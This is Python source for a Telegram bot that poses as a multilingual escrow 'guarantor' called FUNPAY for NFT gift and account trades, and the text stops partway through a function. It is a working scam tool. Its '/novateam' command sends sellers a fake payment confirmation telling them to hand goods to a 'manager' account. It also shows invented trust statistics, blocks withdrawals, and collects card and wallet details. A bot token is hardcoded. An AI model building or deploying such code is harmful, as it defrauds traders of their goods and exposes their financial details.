import asyncio
import logging
import sqlite3
import uuid
import os
from datetime import datetime
from aiohttp import web

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder

BOT_TOKEN = "8715914131:AAHKF1nC32BWiAAjGMrXWmIFFRoVIH-eft4"
ADMIN_IDS = [8625870625]
VIDEO_URL = "https://youtu.be/en30WSXTX90"
BOT_USERNAME = "secretariOffreybot"
PORT = int(os.environ.get("PORT", 8080))

logging.basicConfig(level=logging.INFO)
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=storage)

conn = sqlite3.connect("funpay_scam.db", check_same_thread=False)
cur = conn.cursor()

cur.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    lang TEXT DEFAULT 'ru',
    card TEXT,
    crypto TEXT,
    stars_username TEXT,
    ref_count INTEGER DEFAULT 0,
    deals_count INTEGER DEFAULT 0,
    successful_deals INTEGER DEFAULT 0
)
""")

cur.execute("""
CREATE TABLE IF NOT EXISTS deals (
    deal_id TEXT PRIMARY KEY,
    seller_id INTEGER,
    buyer_id INTEGER,
    deal_type TEXT,
    description TEXT,
    amount INTEGER,
    currency TEXT,
    seller_req TEXT,
    buyer_req TEXT,
    status TEXT,
    seller_username TEXT,
    buyer_username TEXT,
    created_at TEXT
)
""")

cur.execute("""
CREATE TABLE IF NOT EXISTS referrals (
    referrer_id INTEGER,
    referred_id INTEGER,
    PRIMARY KEY (referrer_id, referred_id)
)
""")

conn.commit()

class DealStates(StatesGroup):
    seller_type = State()
    seller_description = State()
    seller_payment_method = State()
    seller_amount = State()
    seller_requisites = State()
    buyer_type = State()
    buyer_description = State()
    buyer_payment_method = State()
    buyer_amount = State()
    buyer_seller_username = State()
    confirm_participation = State()
    requisites_input = State()
    funds_deposit = State()

TEXTS = {
    'ru': {
        'main_menu': """<b># FUNPAY</b>

<b>Безопасный гарант для сделок в Telegram.</b>

<b>Что внутри:</b>
• защита от мошенников
• удержание средств до завершения сделки
• история и статусы сделок
• поддержка через @GiftForFunpay

<b>Выберите действие ниже.</b>""",
        'create_deal': 'Выберите вашу роль в сделке:',
        'seller_role': 'Выберите тип сделки:',
        'buyer_role': 'Выберите тип сделки:',
        'deal_type_account': 'Опишите предмет сделки\n\nУкажите важные детали, условия передачи и дополнительные договоренности.',
        'deal_type_gift': 'Отправьте ссылку на NFT Gift\n\nМожно указать одну или несколько ссылок, например:\nhttps://t.me/nft/DurovsCap-1',
        'payment_method': 'Выберите способ оплаты:',
        'amount': 'Введите сумму сделки в {currency}\n\nТолько целое число.',
        'requisites': {
            'rub': 'Введите номер карты\n\nНа нее будет отправлена оплата после завершения сделки.',
            'uah': 'Введите номер карты\n\nНа нее будет отправлена оплата после завершения сделки.',
            'byn': 'Введите номер карты\n\nНа нее будет отправлена оплата после завершения сделки.',
            'stars': 'Введите юзернейм для получения Stars\n\nНапример: @username',
            'usdt': 'Введите адрес криптокошелька',
            'ton': 'Введите адрес криптокошелька'
        },
        'deal_created': '<b>Сделка #{deal_id} создана</b>\n\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Реквизиты:</b> {requisites}\n\n<b>Ссылка для покупателя:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n<b>Статус:</b> ожидаем покупателя.',
        'deal_created_buyer': '<b>Сделка #{deal_id} создана</b>\n\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n\n<b>Ожидаем подтверждение продавца:</b> {seller_username}\n\n<b>Ссылка для продавца:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
        'deal_show_seller': '<b>Сделка #{deal_id}</b>\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Оплата:</b> {currency}\n\n<b>Вы указаны как продавец. Подтвердите участие.</b>',
        'deal_show_buyer': '<b>Сделка #{deal_id}</b>\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Реквизиты продавца:</b> {seller_req}\n\n<b>Ожидайте подтверждения от продавца.</b>',
        'deal_status': '<b>Сделка #{deal_id}</b>\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Статус:</b> {status}',
        'confirm_requisites': 'Выберите тип реквизитов для подтверждения:',
        'requisites_saved': 'Реквизиты сохранены. Ожидаем оплату.',
        'buyer_notify': '✅ Продавец подтвердил участие в сделке #{deal_id}\n\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Реквизиты продавца:</b> {seller_req}\n\n<b>Для имитации оплаты напишите:</b> /novateam',
        'novateam_seller': '<b>💳 Оплата подтверждена</b>\n\n<b>Сделка:</b> #{deal_id}\n<b>Покупатель:</b> @{buyer}\n<b>Сумма:</b> {amount} {currency}\n<b>Предмет:</b> {description}\n\n<b>🛡 Передайте товар менеджеру @GiftsForFunpay</b>',
        'novateam_buyer': '✅ Оплата подтверждена! Сделка #{deal_id} завершена.',
        'funds_menu': 'Выберите действие:',
        'funds_deposit': 'Введите ID сделки для оплаты',
        'funds_deposit_error': '🚫 Сделка не найдена.',
        'funds_withdraw': 'Вывести деньги можно только от 2 сделок\nУ Вас 0/2',
        'my_deals_empty': '📭 У вас нет активных сделок.',
        'my_deals_list': '📋 Ваши сделки:\n\n{deals}',
        'requisites_menu': '💳 Ваши реквизиты:\n\nВыберите тип для просмотра или изменения.',
        'requisites_card': 'Введите номер банковской карты',
        'requisites_crypto': 'Введите адрес криптокошелька',
        'requisites_stars': 'Введите юзернейм для получения Stars\n\nНапример: @username',
        'requisites_saved': 'Реквизиты сохранены.',
        'lang_menu': '🌐 Выберите язык / Choose language / 选择语言:',
        'lang_set': 'Язык установлен: {lang}',
        'support': '📞 Поддержка: @GiftForFunpay\n\nПо всем вопросам обращайтесь к менеджеру.',
        'verify': '''🛡 Верификация

Верификация доступна пользователям с 30+ успешными сделками и оборотом от 1500 USDT.

Преимущества:
• автовывод средств
• приоритетная поддержка
• ускоренное решение спорных ситуаций
Подайте заявку, и администрация рассмотрит ее.''',
        'verify_button': 'Подать заявку',
        'referral': '👥 Реферальная система\n\nВаша реферальная ссылка:\nhttps://t.me/{bot_username}?start=ref{user_id}\n\nПриглашено: {ref_count} человек',
        'about': '''Funpay

Всего сделок: 107107
Успешных сделок: 103835
Общий объем: $1105228
Рейтинг: 4.9/5.0
Онлайн: 15756

🛡 Гарант-сервис
✅ Проверенные продавцы
📢 Поддержка 24/7

🔗 @GiftsForFunpay''',
        'back': '🔙 Назад',
        'seller': 'Я продавец',
        'buyer': 'Я покупатель',
        'account': 'Аккаунт',
        'gift': 'NFT Gift',
        'card': 'Карта',
        'crypto': 'Крипта',
        'stars': 'Stars'
    },
    'en': {
        'main_menu': """<b># FUNPAY</b>

<b>Safe guarantor for deals in Telegram.</b>

<b>What inside:</b>
• protection from scammers
• funds holding until deal completion
• deal history and statuses
• support via @GiftForFunpay

<b>Select action below.</b>""",
        'create_deal': 'Choose your role:',
        'seller_role': 'Choose deal type:',
        'buyer_role': 'Choose deal type:',
        'deal_type_account': 'Describe the deal item\n\nSpecify important details, transfer conditions and additional agreements.',
        'deal_type_gift': 'Send NFT Gift link\n\nYou can specify one or more links, e.g.:\nhttps://t.me/nft/DurovsCap-1',
        'payment_method': 'Choose payment method:',
        'amount': 'Enter deal amount in {currency}\n\nInteger only.',
        'requisites': {
            'rub': 'Enter card number\n\nPayment will be sent to it after deal completion.',
            'uah': 'Enter card number\n\nPayment will be sent to it after deal completion.',
            'byn': 'Enter card number\n\nPayment will be sent to it after deal completion.',
            'stars': 'Enter username for Stars\n\nExample: @username',
            'usdt': 'Enter crypto wallet address',
            'ton': 'Enter crypto wallet address'
        },
        'deal_created': '<b>Deal #{deal_id} created</b>\n\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Requisites:</b> {requisites}\n\n<b>Link for buyer:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n<b>Status:</b> waiting for buyer.',
        'deal_created_buyer': '<b>Deal #{deal_id} created</b>\n\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n\n<b>Waiting for seller confirmation:</b> {seller_username}\n\n<b>Link for seller:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
        'deal_show_seller': '<b>Deal #{deal_id}</b>\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Payment:</b> {currency}\n\n<b>You are listed as seller. Confirm participation.</b>',
        'deal_show_buyer': '<b>Deal #{deal_id}</b>\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Seller requisites:</b> {seller_req}\n\n<b>Waiting for seller confirmation.</b>',
        'deal_status': '<b>Deal #{deal_id}</b>\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Status:</b> {status}',
        'confirm_requisites': 'Select requisites type for confirmation:',
        'requisites_saved': 'Requisites saved. Waiting for payment.',
        'buyer_notify': '✅ Seller confirmed participation in deal #{deal_id}\n\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Seller requisites:</b> {seller_req}\n\n<b>For payment simulation type:</b> /novateam',
        'novateam_seller': '<b>💳 Payment confirmed</b>\n\n<b>Deal:</b> #{deal_id}\n<b>Buyer:</b> @{buyer}\n<b>Amount:</b> {amount} {currency}\n<b>Item:</b> {description}\n\n<b>🛡 Transfer item to manager @GiftsForFunpay</b>',
        'novateam_buyer': '✅ Payment confirmed! Deal #{deal_id} completed.',
        'funds_menu': 'Select action:',
        'funds_deposit': 'Enter deal ID for payment',
        'funds_deposit_error': '🚫 Deal not found.',
        'funds_withdraw': 'Withdrawal available from 2 deals\nYou have 0/2',
        'my_deals_empty': '📭 You have no active deals.',
        'my_deals_list': '📋 Your deals:\n\n{deals}',
        'requisites_menu': '💳 Your requisites:\n\nSelect type to view or change.',
        'requisites_card': 'Enter bank card number',
        'requisites_crypto': 'Enter crypto wallet address',
        'requisites_stars': 'Enter username for Stars\n\nExample: @username',
        'requisites_saved': 'Requisites saved.',
        'lang_menu': '🌐 Choose language:',
        'lang_set': 'Language set: {lang}',
        'support': '📞 Support: @GiftForFunpay\n\nContact manager for any questions.',
        'verify': '''🛡 Verification

Verification available for users with 30+ successful deals and turnover from 1500 USDT.

Benefits:
• auto withdrawal
• priority support
• faster dispute resolution
Submit request and administration will review it.''',
        'verify_button': 'Submit request',
        'referral': '👥 Referral system\n\nYour referral link:\nhttps://t.me/{bot_username}?start=ref{user_id}\n\nInvited: {ref_count} people',
        'about': '''Funpay

Total deals: 107107
Successful deals: 103835
Total volume: $1105228
Rating: 4.9/5.0
Online: 15756

🛡 Guarantor service
✅ Verified sellers
📢 24/7 Support

🔗 @GiftsForFunpay''',
        'back': '🔙 Back',
        'seller': 'I am seller',
        'buyer': 'I am buyer',
        'account': 'Account',
        'gift': 'NFT Gift',
        'card': 'Card',
        'crypto': 'Crypto',
        'stars': 'Stars'
    },
    'zh': {
        'main_menu': """<b># FUNPAY</b>

<b>Telegram交易安全担保。</b>

<b>功能：</b>
• 防欺诈保护
• 交易完成前资金冻结
• 交易历史与状态
• 通过 @GiftForFunpay 支持

<b>请选择操作。</b>""",
        'create_deal': '选择您的角色：',
        'seller_role': '选择交易类型：',
        'buyer_role': '选择交易类型：',
        'deal_type_account': '描述交易物品\n\n请注明重要细节、转让条件和附加协议。',
        'deal_type_gift': '发送NFT Gift链接\n\n可以指定一个或多个链接，例如：\nhttps://t.me/nft/DurovsCap-1',
        'payment_method': '选择支付方式：',
        'amount': '输入 {currency} 交易金额\n\n仅限整数。',
        'requisites': {
            'rub': '输入银行卡号\n\n交易完成后将付款至此卡。',
            'uah': '输入银行卡号\n\n交易完成后将付款至此卡。',
            'byn': '输入银行卡号\n\n交易完成后将付款至此卡。',
            'stars': '输入接收Stars的用户名\n\n例如：@username',
            'usdt': '输入加密货币钱包地址',
            'ton': '输入加密货币钱包地址'
        },
        'deal_created': '<b>交易 #{deal_id} 已创建</b>\n\n<b>类型：</b>{deal_type}\n<b>描述：</b>{description}\n<b>金额：</b>{amount} {currency}\n<b>收款方式：</b>{requisites}\n\n<b>买家链接：</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n<b>状态：</b>等待买家。',
        'deal_created_buyer': '<b>交易 #{deal_id} 已创建</b>\n\n<b>类型：</b>{deal_type}\n<b>描述：</b>{description}\n<b>金额：</b>{amount} {currency}\n\n<b>等待卖家确认：</b>{seller_username}\n\n<b>卖家链接：</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
        'deal_show_seller': '<b>交易 #{deal_id}</b>\n<b>类型：</b>{deal_type}\n<b>描述：</b>{description}\n<b>金额：</b>{amount} {currency}\n<b>支付：</b>{currency}\n\n<b>您被列为卖家。请确认参与。</b>',
        'deal_show_buyer': '<b>交易 #{deal_id}</b>\n<b>类型：</b>{deal_type}\n<b>描述：</b>{description}\n<b>金额：</b>{amount} {currency}\n<b>卖家收款方式：</b>{seller_req}\n\n<b>等待卖家确认。</b>',
        'deal_status': '<b>交易 #{deal_id}</b>\n<b>类型：</b>{deal_type}\n<b>描述：</b>{description}\n<b>金额：</b>{amount} {currency}\n<b>状态：</b>{status}',
        'confirm_requisites': '选择确认收款方式：',
        'requisites_saved': '收款方式已保存。等待付款。',
        'buyer_notify': '✅ 卖家已确认参与交易 #{deal_id}\n\n<b>类型：</b>{deal_type}\n<b>描述：</b>{description}\n<b>金额：</b>{amount} {currency}\n<b>卖家收款方式：</b>{seller_req}\n\n<b>模拟付款请发送：</b>/novateam',
        'novateam_seller': '<b>💳 付款已确认</b>\n\n<b>交易：</b>#{deal_id}\n<b>买家：</b>@{buyer}\n<b>金额：</b>{amount} {currency}\n<b>物品：</b>{description}\n\n<b>🛡 请将物品转交给管理员 @GiftsForFunpay</b>',
        'novateam_buyer': '✅ 付款已确认！交易 #{deal_id} 已完成。',
        'funds_menu': '请选择操作：',
        'funds_deposit': '输入交易ID进行付款',
        'funds_deposit_error': '🚫 未找到交易。',
        'funds_withdraw': '需要完成2笔交易才能提现\n您有 0/2',
        'my_deals_empty': '📭 您没有活跃的交易。',
        'my_deals_list': '📋 您的交易：\n\n{deals}',
        'requisites_menu': '💳 您的收款方式：\n\n选择类型查看或修改。',
        'requisites_card': '输入银行卡号',
        'requisites_crypto': '输入加密货币钱包地址',
        'requisites_stars': '输入接收Stars的用户名\n\n例如：@username',
        'requisites_saved': '收款方式已保存。',
        'lang_menu': '🌐 选择语言 / Choose language / 选择语言：',
        'lang_set': '语言已设置：{lang}',
        'support': '📞 支持：@GiftForFunpay\n\n如有问题请联系管理员。',
        'verify': '''🛡 认证

拥有30+成功交易且营业额超过1500 USDT的用户可进行认证。

优势：
• 自动提现
• 优先支持
• 加速争议解决
提交申请，管理员将审核。''',
        'verify_button': '提交申请',
        'referral': '👥 推荐系统\n\n您的推荐链接：\nhttps://t.me/{bot_username}?start=ref{user_id}\n\n已邀请：{ref_count} 人',
        'about': '''Funpay

总交易：107107
成功交易：103835
总交易额：$1105228
评级：4.9/5.0
在线：15756

🛡 担保服务
✅ 已认证卖家
📢 24/7 支持

🔗 @GiftsForFunpay''',
        'back': '🔙 返回',
        'seller': '我是卖家',
        'buyer': '我是买家',
        'account': '账号',
        'gift': 'NFT礼品',
        'card': '银行卡',
        'crypto': '加密货币',
        'stars': 'Stars'
    }
}

def get_text(key, lang='ru', **kwargs):
    text = TEXTS.get(lang, TEXTS['ru']).get(key, key)
    if isinstance(text, dict):
        return text
    try:
        return text.format(**kwargs)
    except:
        return text

def get_button_text(key, lang='ru'):
    texts = {
        'ru': {'back': '🔙 Назад', 'seller': 'Я продавец', 'buyer': 'Я покупатель', 'account': 'Аккаунт', 'gift': 'NFT Gift', 'card': 'Карта', 'crypto': 'Крипта', 'stars': 'Stars'},
        'en': {'back': '🔙 Back', 'seller': 'I am seller', 'buyer': 'I am buyer', 'account': 'Account', 'gift': 'NFT Gift', 'card': 'Card', 'crypto': 'Crypto', 'stars': 'Stars'},
        'zh': {'back': '🔙 返回', 'seller': '我是卖家', 'buyer': '我是买家', 'account': '账号', 'gift': 'NFT礼品', 'card': '银行卡', 'crypto': '加密货币', 'stars': 'Stars'}
    }
    return texts.get(lang, texts['ru']).get(key, key)

async def send_with_video(chat_id, text, reply_markup=None, parse_mode="HTML"):
    try:
        await bot.send_video(chat_id=chat_id, video=VIDEO_URL, caption=text, reply_markup=reply_markup, parse_mode=parse_mode)
    except:
        await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)

def get_main_menu(lang="ru"):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_text('create_deal', lang), callback_data="create_deal"))
    builder.row(InlineKeyboardButton(text=get_text('funds_menu', lang), callback_data="funds"), InlineKeyboardButton(text="Мои сделки", callback_data="my_deals"))
    builder.row(InlineKeyboardButton(text="Реквизиты", callback_data="requisites"), InlineKeyboardButton(text="Язык", callback_data="lang"))
    builder.row(InlineKeyboardButton(text="Поддержка", callback_data="support"), InlineKeyboardButton(text="Верификация", callback_data="verify"))
    builder.row(InlineKeyboardButton(text="Рефералы", callback_data="referral"), InlineKeyboardButton(text="О сервисе", callback_data="about"))
    return builder.as_markup()

def get_back_button(lang="ru"):
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=get_button_text('back', lang), callback_data="main_menu")]])

def get_roles_menu(lang="ru"):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_button_text('seller', lang), callback_data="seller_role"))
    builder.row(InlineKeyboardButton(text=get_button_text('buyer', lang), callback_data="buyer_role"))
    builder.row(InlineKeyboardButton(text=get_button_text('back', lang), callback_data="main_menu"))
    return builder.as_markup()

def get_deal_types(lang="ru"):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_button_text('account', lang), callback_data="deal_type_account"))
    builder.row(InlineKeyboardButton(text=get_button_text('gift', lang), callback_data="deal_type_gift"))
    builder.row(InlineKeyboardButton(text=get_button_text('back', lang), callback_data="main_menu"))
    return builder.as_markup()

def get_payment_methods(lang="ru"):
    methods = ['Рубли', 'Гривны', 'BYN', 'Stars', 'USDT', 'TON'] if lang == "ru" else ['RUB', 'UAH', 'BYN', 'Stars', 'USDT', 'TON']
    builder = InlineKeyboardBuilder()
    for m in methods:
        builder.row(InlineKeyboardButton(text=m, callback_data=f"payment_{m.lower()}"))
    builder.row(InlineKeyboardButton(text=get_button_text('back', lang), callback_data="main_menu"))
    return builder.as_markup()

def get_requisites_menu(lang="ru"):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_button_text('card', lang), callback_data="req_card_save"))
    builder.row(InlineKeyboardButton(text=get_button_text('crypto', lang), callback_data="req_crypto_save"))
    builder.row(InlineKeyboardButton(text=get_button_text('stars', lang), callback_data="req_stars_save"))
    builder.row(InlineKeyboardButton(text=get_button_text('back', lang), callback_data="main_menu"))
    return builder.as_markup()

def get_funds_menu(lang="ru"):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="Пополнить", callback_data="funds_deposit"))
    builder.row(InlineKeyboardButton(text="Вывести", callback_data="funds_withdraw"))
    builder.row(InlineKeyboardButton(text=get_button_text('back', lang), callback_data="main_menu"))
    return builder.as_markup()

def get_lang_menu():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="Русский", callback_data="lang_ru"))
    builder.row(InlineKeyboardButton(text="English", callback_data="lang_en"))
    builder.row(InlineKeyboardButton(text="中文", callback_data="lang_zh"))
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))
    return builder.as_markup()

def generate_deal_id():
    return str(uuid.uuid4())[:8]

def get_user_lang(user_id):
    cur.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,))
    result = cur.fetchone()
    return result[0] if result else "ru"

def get_user_username(user_id):
    cur.execute("SELECT username FROM users WHERE user_id = ?", (user_id,))
    result = cur.fetchone()
    return result[0] if result else None

def save_user(user_id, username):
    cur.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, username))
    conn.commit()

def save_requisites(user_id, req_type, value):
    if req_type == "card":
        cur.execute("UPDATE users SET card = ? WHERE user_id = ?", (value, user_id))
    elif req_type == "crypto":
        cur.execute("UPDATE users SET crypto = ? WHERE user_id = ?", (value, user_id))
    elif req_type == "stars":
        cur.execute("UPDATE users SET stars_username = ? WHERE user_id = ?", (value, user_id))
    conn.commit()

def get_user_requisites(user_id):
    cur.execute("SELECT card, crypto, stars_username FROM users WHERE user_id = ?", (user_id,))
    return cur.fetchone()

def create_deal(seller_id, deal_type, description, amount, currency, seller_req, seller_username=None):
    deal_id = generate_deal_id()
    cur.execute("INSERT INTO deals (deal_id, seller_id, deal_type, description, amount, currency, seller_req, status, seller_username, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (deal_id, seller_id, deal_type, description, amount, currency, seller_req, "waiting_buyer", seller_username, datetime.now().isoformat()))
    conn.commit()
    return deal_id

def create_deal_buyer(buyer_id, seller_username, deal_type, description, amount, currency):
    deal_id = generate_deal_id()
    cur.execute("INSERT INTO deals (deal_id, buyer_id, deal_type, description, amount, currency, status, buyer_username, seller_username, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (deal_id, buyer_id, deal_type, description, amount, currency, "waiting_seller_confirm", get_user_username(buyer_id), seller_username, datetime.now().isoformat()))
    conn.commit()
    return deal_id

def get_deal(deal_id):
    cur.execute("SELECT * FROM deals WHERE deal_id = ?", (deal_id,))
    return cur.fetchone()

def update_deal_status(deal_id, status):
    cur.execute("UPDATE deals SET status = ? WHERE deal_id = ?", (status, deal_id))
    conn.commit()

def update_deal_seller_req(deal_id, req):
    cur.execute("UPDATE deals SET seller_req = ? WHERE deal_id = ?", (req, deal_id))
    conn.commit()

def get_user_deals(user_id):
    cur.execute("SELECT * FROM deals WHERE seller_id = ? OR buyer_id = ? ORDER BY created_at DESC", (user_id, user_id))
    return cur.fetchall()

@dp.message(CommandStart())
async def cmd_start(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username
    save_user(user_id, username)
    
    if " " in message.text:
        args = message.text.split(" ", 1)[1]
        if args.startswith("ref"):
            ref_id = args.replace("ref", "")
            if ref_id.isdigit() and int(ref_id) != user_id:
                cur.execute("INSERT OR IGNORE INTO referrals (referrer_id, referred_id) VALUES (?, ?)", (int(ref_id), user_id))
                cur.execute("UPDATE users SET ref_count = ref_count + 1 WHERE user_id = ?", (int(ref_id),))
                conn.commit()
        elif args.startswith("deal_"):
            deal_id = args.replace("deal_", "")
            await show_deal_for_user(message, deal_id)
            return
    
    lang = get_user_lang(user_id)
    await send_with_video(chat_id=message.chat.id, text=get_text('main_menu', lang), reply_markup=get_main_menu(lang))

@dp.message(Command("novateam"))
async def cmd_novateam(message: Message):
    user_id = message.from_user.id
    lang = get_user_lang(user_id)
    
    cur.execute("SELECT * FROM deals WHERE buyer_id = ? AND status = 'waiting_payment' ORDER BY created_at DESC LIMIT 1", (user_id,))
    deal = cur.fetchone()
    
    if not deal:
        await message.answer(get_text('funds_deposit_error', lang))
        return
    
    deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at = deal
    buyer_username = buyer_username or get_user_username(buyer_id)
    
    seller_text = get_text('novateam_seller', get_user_lang(seller_id), deal_id=deal_id, buyer=buyer_username, amount=amount, currency=currency, description=description)
    await bot.send_message(chat_id=seller_id, text=seller_text, parse_mode="HTML")
    
    await message.answer(get_text('novateam_buyer', lang, deal_id=deal_id))
    
    update_deal_status(deal_id, "completed")
    cur.execute("UPDATE users SET successful_deals = successful_deals + 1 WHERE user_id = ?", (seller_id,))
    if buyer_id:
        cur.execute("UPDATE users SET successful_deals = successful_deals + 1 WHERE user_id = ?", (buyer_id,))
    conn.commit()

async def show_deal_for_user(message: Message, deal_id: str):
    deal = get_deal(deal_id)
    if not deal:
        await message.answer("❌ Сделка не найдена")
        return
    
    deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at = deal
    user_id = message.from_user.id
    lang = get_user_lang(user_id)
    
    if user_id != seller_id and buyer_id is None:
        cur.execute("UPDATE deals SET buyer_id = ?, buyer_username = ? WHERE deal_id = ?", (user_id, message.from_user.username, deal_id))
        conn.commit()
        deal = get_deal(deal_id)
        deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at = deal
    
    if user_id != seller_id and user_id != buyer_id:
        await message.answer("❌ Вы не участвуете в этой сделке")
        return
